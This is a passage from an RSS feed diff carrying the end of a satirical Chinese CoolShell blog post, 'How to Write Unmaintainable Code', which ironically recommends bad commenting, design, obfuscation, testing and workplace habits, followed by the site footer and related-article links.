+<li><strong>只注释是什么，而不是为什么</strong>。</li>
+<li><strong>不要注释秘密</strong>。如果你开发一个航班系统，请你一定要保证每有一个新的航班被加入，就得要修改25个以上的位置的程序。千万别把这个事写在文档中。</li>
+<li><strong>注重细节</strong>。当你设计一个很复杂的算法的时候，你一定要把所有的详细细设计都写下来，没有100页不能罢休，段落要有5级以上，段落编号要有500个以上，例如：1.2.4.6.3.13 &#8211; Display all impacts for activity where selected mitigations can apply (short pseudocode omitted). 这样，当你写代码的时候，你就可以让你的代码和文档一致，如：Act1_2_4_6_3_13()</li>
+<li><strong>千万不要注释度衡单位</strong>。比如时间用的是秒还是毫秒，尺寸用的是像素还是英寸，大小是MB还是KB。等等。另外，在你的代码里，你可以混用不同的度衡单位，但也不要注释。</li>
+<li><strong>Gotchas</strong>。陷阱，千万不要注释代码中的陷阱。</li>
+<li><strong>在注释和文档中发泄不满</strong>。（参看本站的“<a title="五种应该避免的代码注释" href="https://coolshell.cn/articles/2746.html" target="_blank">五种应该避免的注释</a>”）</li>
+</ul>
+<h4>程序设计</h4>
+<ul>
+<li><strong>Java Casts</strong>。Java的类型转型是天赐之物。每一次当你从Collection里取到一个object的时候，你都需要把其转回原来的类型。因些，这些转型操作会出现在N多的地方。如果你改变了类型，那么你不一定能改变所有的地方。而编译器可能能检查到，也可能检查不到。</li>
+<li><strong>利用Java的冗余</strong>。比如：Bubblegum b = new Bubblegom(); 和 swimmer = swimner + 1; 注意变量间的细微差别。</li>
+<li><strong>从不验证</strong>。从不验证输入的数据，从不验证函数的返回值。这样做可以向大家展示你是多么的信任公司的设备和其它程序员。</li>
+<li><strong>不要封装</strong>。调用者需要知道被调用的所有的细节。</li>
+<li><strong>克隆和拷贝</strong>。为了效率，你要学会使用copy + paste。你几乎都不用理解别人的代码，你就可以高效地编程了。（陈皓注：Copy + Paste出来的代码bug多得不能再多）</li>
+<li><strong>巨大的listener</strong>。写一个listener，然后让你的所有的button类都使用这个listener，这样你可以在这个listener中整出一大堆if&#8230;else&#8230;语句，相当的刺激。</li>
+<li><strong>使用三维数组</strong>。如果你觉得三维还不足够，你可以试试四维。</li>
+<li><strong>混用</strong>。同时使用类的get/set方法和直接访问那个public变量。这样做的好处是可以极大的挫败维护人员。</li>
+<li><strong>包装，包装，包装</strong>。把你所有的API都包装上6到8遍，包装深度多达4层以上。然后包装出相似的功能。</li>
+<li><strong>没有秘密</strong>。把所有的成员都声明成public的。这样，你以后就很难限制其被人使用，而且这样可以和别的代码造成更多的耦合度，可以让你的代码存活得更久。</li>
+<li><strong>排列和阻碍</strong>。把drawRectangle(height, width) 改成 drawRectangle(width, height)，等release了几个版本后，再把其改回去。这样维护程序的程序员们将不能很快地明白哪一个是对的。</li>
+<li><strong>把变量改在名字上</strong>。例如，把setAlignment(int alignment)改成，setLeftAlignment, setRightAlignment, setCenterAlignment。</li>
+<li><strong>Packratting</strong>。保留你所有的没有使用的和陈旧的变量，方法和代码。</li>
+<li><strong>That&#8217;s Fina</strong>l。Final你所有的子结点的类，这样，当你做完这个项目后，没有人可以通过继承来扩展你的类。java.lang.String不也是这样吗？</li>
+<li><strong>避免使用接口</strong>。在java中，BS接口，在C++中BS使用虚函数。</li>
+<li><strong>避免使用layout</strong>。这样就使得我们只能使用绝对坐标。如果你的老大强制你使用layout，你可以考虑使用GridBagLayout，然后把grid坐标hard code.</li>
+<li><strong>环境变量</strong>。如果你的代码需要使用环境变量。(getenv() &#8211; C++ / System.getProperty() &#8211; Java )，那么，你应该把你的类的成员的初始化使用环境变量，而不是构造函数。</li>
+<li><strong>使用Magic numbe</strong>r。参看《<a title="Linux 2.6.39-rc3的一个插曲" href="https://coolshell.cn/articles/4576.html" target="_blank">Linux一个插曲</a>》。</li>
+<li><strong>使用全局变量</strong>。1）把全局变量的初始化放在不同的函数中，就算这个函数和这个变量没有任何关系，这样能够让我们的维护人员就像做侦探工作一样。2）使用全局变量可以让你的函数的参数变得少一些。</li>
+<li><strong>配置文件</strong>。配置文件主要用于一些参数的初始化。在编程中，我们可以让配置文件中的参数名和实际程序中的名字不一样。</li>
+<li><strong>膨胀你的类</strong>。让你的类尽可能地拥有各种臃肿和晦涩的方法。比如，你的类只实现一种可能性，但是你要提供所有可能性的方法。不要定义其它的类，把所有的功能都放在一个类中。</li>
+<li><strong>使用子类</strong>。面向对象是写出无法维护代码的天赐之物。如果你有一个类有十个成为（变量和方法）你可以考虑写10个层次的继承，然后把这十个属性分别放在这十个层次中。如果可能的话，把这十个类分别放在十个不同的文件中。</li>
+</ul>
+<h4>混乱你的代码</h4>
+<ul>
+<li><strong>使用XML</strong>。XML的强大是无人能及的。使用XML你可以把本来只要10行的代码变成100行。而且，还要逼着别人也有XML。（参看，<a title="信XML，得永生！" href="https://coolshell.cn/articles/2504.html" target="_blank">信XML得永生</a>，<a title="信XML，得自信" href="https://coolshell.cn/articles/3498.html" target="_blank">信XML得自信</a>）</li>
+<li><strong>混乱C代码</strong>。在《<a title="如何加密/混乱C源代码" href="https://coolshell.cn/articles/933.html" target="_blank">如何加密源代码</a>》中已经说过一些方法了，这里再补充一些。</li>
+<li><strong>使用不同的进制</strong>。比如：10 和010不是一样的。再比如：array = new int[]{   111,   120,   013,   121,};</li>
+<li><strong>尽量使用void*</strong>。然后把其转成各种类型</li>
+<li><strong>使用隐式的转型</strong>。C++的构造函数可以让你神不知鬼不觉得完成转型。</li>
+<li><strong>分解条件表达式</strong>。如：把 a==100分解成，a&gt;99 &amp;&amp; a&lt;101</li>
+<li><strong>学会利用分号</strong>。如：if ( a );else;{   int d;   d = c;}</li>
+<li><strong>间接转型</strong>。如：把double转string，写成new Double(d).toString() 而不是 Double.toString(d)</li>
+<li><strong>大量使用嵌套</strong>。一个NB的程序员可以在一行代码上使用超过10层的小括号（），或是在一个函数里使用超过20层的语句嵌套{}，把嵌套的if else 转成 [? :] 也是一件很NB的事。</li>
+<li><strong>使用C的变种数组</strong>。myArray[i] 可以变成*(myArray + i) 也可以变成 *(i + myArray) 其等价于 i[myArray]。再看一个函数调用的示例，函数声明：int myfunc(int q, int p) { return p%q; } 函数调用myfunc(6291, 8)[Array];</li>
+<li><strong>长代码行</strong>。一行的代码越长越好。这样别人阅读时就需要来来回回的</li>
+<li><strong>不要较早的return</strong>。不要使用goto，不要使用break，这样，你就需要至少5层以上的if-else来处理错误。</li>
+<li><strong>不要使用{}</strong>。不要在if else使用{}，尤其是在你重量地使用if-else嵌套时，你甚至可以在其中乱缩进代码，这样一来，就算是最有经验的程序员也会踩上陷阱。</li>
+<li><strong>使用宏定义</strong>。宏定义绝对是混乱C/C++代码的最佳利器。参看 <a title="老手是这样教新手编程的" href="https://coolshell.cn/articles/2420.html" target="_blank">老手是这样教新手编程的</a>。</li>
+<li><strong>琐碎的封装</strong>。比较封装一个bool类，类里面什么都做，就是一个bool.</li>
+<li><strong>循环</strong>。千万不可用for(int i=0; i&lt;n; i++)使用while代替for，交换n和i，把&lt;改成&lt;=，使用 i&#8211;调整步伐 。</li>
+</ul>
+<h4>测试</h4>
+<ul>
+<li><strong>从不测试</strong>。千万不要测试任何的出错处理，从来也不检测系统调用的返回值。</li>
+<li><strong>永远不做性能测试</strong>。如果不够快就告诉用户换一个更快的机器。如果你一做测试，那么就可能会要改你的算法，甚至重设计，重新架构。</li>
+<li><strong>不要写测试案例</strong>。不要做什么代码覆盖率测试，自动化测试。</li>
+<li><strong>测试是懦夫行为</strong>。一个勇敢的程序员是根本不需要这一步的。太多的程序太害怕他们的老板，害怕失去工作，害怕用户抱怨，甚至被起诉。这种担心害怕直接影响了生产力。如果你对你的代码有强大的信心，那还要什么测试呢？真正的程序员是不需要测试自己的代码的。</li>
+</ul>
+<h4>其它</h4>
+<ul>
+<li><strong>你的老板什么都知道</strong>。无论你的老板有多SB，你都要严格地遵照他的旨意办事，这样一来，你会学到更多的知识如何写出无法维护的代码来的。</li>
+<li><strong>颠覆Help Desk</strong>。你要确保你那满是bug的程序永远不要被维护团队知道。当用户打电话和写邮件给你的时候，你就不要理会，就算要理会，让用户重做系统或是告诉用户其帐号有问题，是标准的回答。</li>
+<li><strong>闭嘴</strong>。对于一些像y2k这样的大bug，你要学会守口如瓶，不要告诉任何人，包括你的亲人好友以及公司的同事和管理层，这样当到那一天的时候，你就可以用这个bug挣钱了。</li>
+<li><strong>忽悠</strong>。你会学会忽悠，就算你的代码写得很烂，你也要为其挂上GoF设计模式的标签，就算你的项目做得再烂，你也要为其挂上敏捷的标签，只有学会<a title="再谈敏捷和ThoughtWorks中国咨询师" href="https://coolshell.cn/articles/3745.html" target="_blank">像中国Thoughtworks的咨询师那样去忽悠</a>，你才能学会更炫更酷的方法，让整个团队和公司，甚至整个业界都开始躁动，这样才能真正为难维护的代码铺平道路。</li>
+</ul>
+<p>这个文档中还有很多很多，实在是太TMD强大了，大家自己去看看吧。有精力有能力的朋友不妨把其翻译成中文。</p>
+<p>总之，我们的口号是——</p>
+<h4 style="text-align: center;">Write Everywhere, Read Nowhere</h4>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2018/05/300x262-150x150.jpg" alt="程序员练级攻略（2018)  与我的专栏" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18360.html" class="wp_rp_title">程序员练级攻略（2018)  与我的专栏</a></li><li ><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/07/api-design-300x278-2-150x150.jpg" alt="API设计原则 &#8211; Qt官网的设计实践总结" width="150" height="150" /></a><a href="https://coolshell.cn/articles/18024.html" class="wp_rp_title">API设计原则 &#8211; Qt官网的设计实践总结</a></li><li ><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/7.jpg" alt="对技术的态度" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8088.html" class="wp_rp_title">对技术的态度</a></li><li ><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/07/programmer-150x150.png" alt="程序员技术练级攻略" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4990.html" class="wp_rp_title">程序员技术练级攻略</a></li><li ><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/25.jpg" alt="如何学好C语言" width="150" height="150" /></a><a href="https://coolshell.cn/articles/4102.html" class="wp_rp_title">如何学好C语言</a></li><li ><a href="https://coolshell.cn/articles/1992.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2009/12/language-fanboys-150x150.jpg" alt="程序员眼中的编程语言" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1992.html" class="wp_rp_title">程序员眼中的编程语言</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/4758.html">如何写出无法维护的代码</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/4758.html/feed</wfw:commentRss>
+			<slash:comments>146</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
